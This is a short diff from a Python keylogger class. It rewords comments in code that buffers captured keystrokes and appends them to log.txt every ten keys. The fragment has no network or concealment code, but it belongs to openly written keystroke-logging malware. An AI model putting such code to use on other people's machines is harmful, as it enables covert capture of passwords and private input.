@@ -24,10 +24,10 @@ class KeyLogger(): # creating new class
                self.keys.append(str(key).replace("'", ""))
 
                if self.count >= 10: # when the number of letters in the list is more than 9, then we write all the letters to the file
-                   with open("log.txt", 'a') as logs: # paste the filename here, dont forget to include the path to the file
+                   with open("log.txt", 'a') as logs: # paste the filename here, dont forget to include the filepath
                         for _ in self.keys:
                           logs.write(_)
-                   self.count=0 # you need to zero the number of characters and the array itself
+                   self.count=0 #  reset the number of characters and the array itself
                    self.keys.clear()
 
 
